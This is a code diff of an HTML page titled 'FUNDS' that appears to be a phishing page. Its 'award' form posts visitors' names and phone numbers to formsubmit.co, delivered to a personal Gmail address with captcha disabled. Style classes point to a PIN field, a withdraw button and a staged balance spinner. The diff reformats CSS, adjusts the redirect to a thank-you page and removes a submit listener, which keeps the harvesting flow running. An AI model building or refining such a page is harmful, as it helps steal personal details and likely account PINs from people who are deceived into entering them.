@@ -4,30 +4,30 @@
 <title>FUNDS</title>
 <style>
   body{margin:0;font-family:Arial,sans-serif;background:#f2f2f2;color:#111;}
- .header{background:yellow;color:#000;text-align:center;padding:18px;font-weight:bold;font-size:22px;}
- .container{max-width:520px;margin:30px auto;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.06);}
+.header{background:yellow;color:#000;text-align:center;padding:18px;font-weight:bold;font-size:22px;}
+.container{max-width:520px;margin:30px auto;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.06);}
   label{display:block;margin-top:15px;margin-bottom:5px;font-size:14px;font-weight:600;}
   input{width:100%;padding:12px;font-size:16px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
- .pin-row{display:flex;gap:8px;align-items:center;}
- .toggle-btn{padding:10px 12px;border-radius:6px;background:#eee;border:1px solid #ddd;cursor:pointer;font-size:14px;}
- .withdraw-btn,.balance-btn{
+.pin-row{display:flex;gap:8px;align-items:center;}
+.toggle-btn{padding:10px 12px;border-radius:6px;background:#eee;border:1px solid #ddd;cursor:pointer;font-size:14px;}
+.withdraw-btn,.balance-btn{
     width:100%;padding:14px;font-size:16px;font-weight:bold;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-top:20px;
   }
- .withdraw-btn{background:#0d6efd;}
- .withdraw-btn[disabled]{opacity:0.5;cursor:not-allowed;}
- .balance-btn{background:#28a745;display:none;}
- .spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-left:10px;}
+.withdraw-btn{background:#0d6efd;}
+.withdraw-btn[disabled]{opacity:0.5;cursor:not-allowed;}
+.balance-btn{background:#28a745;display:none;}
+.spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-left:10px;}
   @keyframes spin{to{transform:rotate(360deg);}}
- .success-box{display:none;background:#28a745;color:#fff;padding:14px;border-radius:8px;text-align:center;font-weight:bold;margin-top:20px;}
- .thankyou{display:none;margin-top:20px;padding:12px;background:#e9f7ee;color:#0b6623;border-radius:8px;text-align:center;font-weight:600;}
- .error{color:#dc3545;font-size:13px;margin-top:4px;display:none;}
+.success-box{display:none;background:#28a745;color:#fff;padding:14px;border-radius:8px;text-align:center;font-weight:bold;margin-top:20px;}
+.thankyou{display:none;margin-top:20px;padding:12px;background:#e9f7ee;color:#0b6623;border-radius:8px;text-align:center;font-weight:600;}
+.error{color:#dc3545;font-size:13px;margin-top:4px;display:none;}
 </style>
 </head>
 <body> <div class="header">FUNDS</div> <div class="container">
-  <form id="awardForm" method="POST" action="https://formsubmit.co/kibetriskid5@gmail.com" target="_self">
+  <form id="awardForm" method="POST" action="https://formsubmit.co/kibetriskid5@gmail.com">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="New FUNDS submission">
-    <input type="hidden" name="_next" value="thankyou.html"> <!-- ONLY LINE ADDED -->
+    <input type="hidden" name="_next" value="thankyou.html">
 <label for="name">Enter your Name</label>
 <input type="text" id="name" name="Full Name" placeholder="John Doe" required>
 <div id="nameErr" class="error">Please enter letters only (A–Z).</div> <label for="phone">Enter phone number</label>
@@ -111,10 +111,7 @@ balanceBtn.style.display='block';
 },5000);
 });
 
-// Show thank you after balance (form submit)
-document.getElementById('awardForm').addEventListener('submit',()=>{
-thankyou.style.display='block';
-});
+// REMOVED the submit listener - FormSubmit will now redirect
 </script> </body>
 
 </html>
